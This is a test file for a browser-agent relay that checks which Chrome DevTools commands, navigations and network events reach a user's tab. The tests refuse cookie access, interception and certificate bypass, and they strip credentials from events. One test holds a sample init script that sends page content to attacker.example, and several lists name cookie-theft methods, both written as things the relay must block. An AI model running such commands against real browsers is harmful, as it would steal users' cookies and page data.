import { describe, expect, it } from 'bun:test';
import { relayRunCommand, relayRunEvent, type RelayRunTab } from '../src/commands.js';

const tab: RelayRunTab = { grant: { origins: ['app.example', '*.docs.example'] }, targetId: 'target', session: 'session', sessionId: 'session', addedBy: 'you' };

describe('script commands on your Chrome', () => {
  it.each([
    'Network.getCookies', 'Network.getAllCookies', 'Network.setCookie', 'Network.setCookies', 'Network.deleteCookies', 'Network.clearBrowserCookies',
    'Network.setExtraHTTPHeaders', 'Network.setRequestInterception', 'Network.loadNetworkResource', 'Page.getCookies',
    'Storage.getCookies', 'Storage.clearDataForOrigin', 'Fetch.enable', 'Fetch.continueRequest', 'IndexedDB.requestData', 'DOMStorage.getDOMStorageItems', 'CacheStorage.requestEntries', 'ServiceWorker.enable', 'Security.setIgnoreCertificateErrors',
    'Browser.getVersion', 'Browser.close', 'Target.createBrowserContext',
    'DOM.setFileInputFiles',
  ])('refuses %s, which reaches beyond the tab', method => {
    expect(relayRunCommand(method, {}, tab)).toHaveProperty('refused');
  });

  it.each([
    ['https://app.example/settings', { send: { url: 'https://app.example/settings', frameId: 'main' } }],
    ['https://a.docs.example/page', { send: { url: 'https://a.docs.example/page', frameId: 'main' } }],
    ['about:blank', { send: { url: 'about:blank', frameId: 'main' } }],
  ])('navigates to %s inside the grant', (url, verdict) => {
    expect(relayRunCommand('Page.navigate', { url, frameId: 'main' }, tab)).toEqual(verdict);
  });

  it.each(['https://bank.example/', 'http://app.example.evil/', 'javascript:alert(1)', 'file:///etc/passwd', 'data:text/html,hi', 'about:srcdoc'])('refuses navigating to %s', url => {
    expect(relayRunCommand('Page.navigate', { url }, tab)).toHaveProperty('refused');
  });

  it('allows a site you dragged in through the tab scope the extension passes', () => {
    expect(relayRunCommand('Page.navigate', { url: 'https://mail.example/inbox' }, { ...tab, grant: { origins: [...tab.grant.origins, 'mail.example'] } })).toHaveProperty('send');
  });

  it.each([
    'Emulation.setDeviceMetricsOverride', 'Emulation.clearDeviceMetricsOverride', 'Emulation.setUserAgentOverride', 'Emulation.setEmulatedMedia', 'Emulation.setTouchEmulationEnabled', 'Emulation.setScrollbarsHidden',
    'Page.setFontFamilies', 'Page.setFontSizes', 'Page.bringToFront', 'Page.setDownloadBehavior', 'Browser.setWindowBounds', 'Target.setAutoAttach',
  ])('answers %s without changing the tab you see', method => {
    expect(relayRunCommand(method, { width: 1, height: 1 }, tab)).toEqual({ noop: true });
  });

  it.each(['Runtime.evaluate', 'Runtime.callFunctionOn', 'DOM.getDocument', 'Input.dispatchMouseEvent', 'Accessibility.getFullAXTree', 'Page.captureScreenshot', 'Network.enable', 'Network.getResponseBody', 'Emulation.setFocusEmulationEnabled', 'Log.enable', 'CSS.enable', 'Overlay.highlightNode', 'DOMSnapshot.captureSnapshot'])('sends %s unchanged', method => {
    expect(relayRunCommand(method, { contextId: 3 }, tab)).toEqual({ send: { contextId: 3 } });
  });

  it.each(['Network.clearBrowserCache', 'Emulation.setGeolocationOverride', 'Debugger.enable', 'HeapProfiler.collectGarbage', 'Target.createTarget', 'Target.detachFromTarget', 'GitSpace.validateRef', 'Tracing.start'])('refuses unlisted %s', method => {
    expect(relayRunCommand(method, {}, tab)).toHaveProperty('refused');
  });

  it('refuses a command for another session or another tab', () => {
    expect(relayRunCommand('Runtime.evaluate', { expression: '1' }, { ...tab, sessionId: 'other' })).toHaveProperty('refused');
    expect(relayRunCommand('Target.attachToTarget', { targetId: 'other', flatten: true }, tab)).toHaveProperty('refused');
    expect(relayRunCommand('Target.attachToTarget', { targetId: 'target', flatten: true }, tab)).toHaveProperty('send');
  });

  it('closes only a tab the agent opened', () => {
    expect(relayRunCommand('Target.closeTarget', { targetId: 'target' }, tab)).toHaveProperty('refused');
    expect(relayRunCommand('Page.close', {}, tab)).toHaveProperty('refused');
    expect(relayRunCommand('Target.closeTarget', { targetId: 'target' }, { ...tab, addedBy: 'page' })).toHaveProperty('refused');
    expect(relayRunCommand('Target.closeTarget', { targetId: 'target' }, { ...tab, addedBy: 'agent' })).toEqual({ send: { targetId: 'target' } });
    expect(relayRunCommand('Target.closeTarget', { targetId: 'other' }, { ...tab, addedBy: 'agent' })).toHaveProperty('refused');
  });

  it('keeps init scripts and universal access off sites outside the grant', () => {
    expect(relayRunCommand('Page.addScriptToEvaluateOnNewDocument', { source: '', worldName: 'utility' }, tab)).toHaveProperty('send');
    expect(relayRunCommand('Page.addScriptToEvaluateOnNewDocument', { source: 'fetch("https://attacker.example/?" + document.body.innerHTML)' }, tab)).toHaveProperty('refused');
    expect(relayRunCommand('Page.createIsolatedWorld', { frameId: 'main', worldName: 'utility', grantUniveralAccess: true }, tab)).toEqual({ send: { frameId: 'main', worldName: 'utility', grantUniveralAccess: false } });
  });
});

describe('script events from your Chrome', () => {
  it('drops raw network extra info', () => {
    expect(relayRunEvent('Network.requestWillBeSentExtraInfo', { requestId: '1', headers: { Cookie: 'session=secret' }, associatedCookies: [] })).toBeNull();
    expect(relayRunEvent('Network.responseReceivedExtraInfo', { requestId: '1', headers: { 'Set-Cookie': 'session=secret' } })).toBeNull();
  });

  it('strips cookies and credentials from network headers, in any case and nesting', () => {
    const event = relayRunEvent('Network.requestWillBeSent', {
      requestId: '1', redirectHasExtraInfo: true,
      request: { url: 'https://app.example/api', headers: { Accept: 'application/json', COOKIE: 'session=secret', Authorization: 'Bearer secret' } },
      redirectResponse: { status: 302, headers: { 'set-cookie': 'session=secret', Location: '/next' }, headersText: 'Set-Cookie: session=secret\r\n', requestHeaders: { 'Proxy-Authorization': 'Basic secret', Host: 'app.example' }, requestHeadersText: 'Cookie: session=secret\r\n' },
    });
    expect(event).toEqual({
      requestId: '1', redirectHasExtraInfo: false,
      request: { url: 'https://app.example/api', headers: { Accept: 'application/json' } },
      redirectResponse: { status: 302, headers: { Location: '/next' }, requestHeaders: { Host: 'app.example' } },
    });
    expect(JSON.stringify(relayRunEvent('Network.webSocketWillSendHandshakeRequest', { requestId: '2', request: { headers: { Cookie: 'session=secret', Origin: 'https://app.example' } } }))).not.toContain('secret');
    expect(relayRunEvent('Network.responseReceived', { requestId: '1', hasExtraInfo: true, response: { status: 200, headers: { 'Content-Type': 'text/html' } } })).toEqual({ requestId: '1', hasExtraInfo: false, response: { status: 200, headers: { 'Content-Type': 'text/html' } } });
  });

  it('forwards other events unchanged', () => {
    const params = { frame: { id: 'main', url: 'https://app.example/' } };
    expect(relayRunEvent('Page.frameNavigated', params)).toBe(params);
  });
});
